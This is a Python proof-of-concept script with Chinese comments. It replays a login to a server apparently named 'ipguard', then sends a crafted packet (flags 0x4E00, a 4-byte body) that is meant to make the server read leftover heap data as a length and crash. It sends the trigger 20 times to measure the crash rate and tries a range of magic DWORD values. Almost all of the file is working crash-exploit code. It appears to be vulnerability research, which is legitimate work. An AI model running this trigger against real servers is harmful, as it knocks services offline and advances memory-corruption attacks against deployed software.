"""poc_4E00_repro_check.py — 回到原始 trigger 测我们假设

假设: body=4 字节恰好让 server 读 body 外 heap 残留当 length 字段。
      不同 heap 状态 → 不同 length 值 → 偶发 OOB unmapped → 崩。

测试:
  1) body=4 字节: 重复 N 次,看真实命中率
  2) body=6/8/10/12 字节但内容 = magic + 攻击者 length: 看是否能稳定避崩 (在 SEH 范围内)
  3) body=4 但前缀其它 magic value (0,2,3...): 看哪些走 ERR 哪些崩
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


def fresh_send(host, port, user, pwd, body, timeout=10.0):
    try:
        base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, lr, st, _ = replay_login(s, user, pwd, base_nonce,
                                       show_crypto=False, verbose=False)
        next_nonce = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=0x4E00, a2=0x4014, a3=6, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body,
        )
        s.sendall(pkt)
        try:
            r = parse_packet(recv_full_packet(s))
            return r, False
        except (socket.timeout, ConnectionError, OSError):
            return None, True
    except Exception as e:
        return {"_err": str(e)}, False
    finally:
        try: s.close()
        except: pass


def check_alive(host, port, timeout=3.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except: return False


def wait_guard(host, port, max_wait=15.0):
    for _ in range(int(max_wait / 0.5)):
        time.sleep(0.5)
        if check_alive(host, port): return True
    return False


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]

    if not check_alive(host, port):
        print("server not alive, abort"); return

    # === T1: body=4 字节, 跑 20 次看命中率 ===
    print("=" * 80)
    print("T1: body=4B exact (replicate v5) × 20")
    print("=" * 80)
    crashes = 0
    for i in range(20):
        if not check_alive(host, port): wait_guard(host, port)
        r, crashed = fresh_send(host, port, user, pwd, b"\x01\x00\x00\x00")
        if crashed:
            crashes += 1
            print(f"  #{i+1:2d}: 💥 CRASH")
            wait_guard(host, port)
        else:
            fl = r.get("flags", 0) if isinstance(r, dict) else 0
            print(f"  #{i+1:2d}: flags=0x{fl:04x} no crash")
    print(f"\n  → {crashes}/20 hit ({crashes*5}%)")

    # === T2: body=4 with different first DWORD ===
    print("\n" + "=" * 80)
    print("T2: body=4B with various magic DWORDs × 5 each")
    print("=" * 80)
    for magic in [0, 1, 2, 3, 4, 5, 0xFF, 0x100, 0x10000, 0xFFFFFFFF]:
        body = struct.pack("<I", magic)
        crashes_t2 = 0
        for _ in range(5):
            if not check_alive(host, port): wait_guard(host, port)
            r, crashed = fresh_send(host, port, user, pwd, body)
            if crashed:
                crashes_t2 += 1
                wait_guard(host, port)
            time.sleep(0.2)
        print(f"  magic=0x{magic:>10x} body={body.hex():<10}  → {crashes_t2}/5 crashed")


if __name__ == "__main__":
    main()
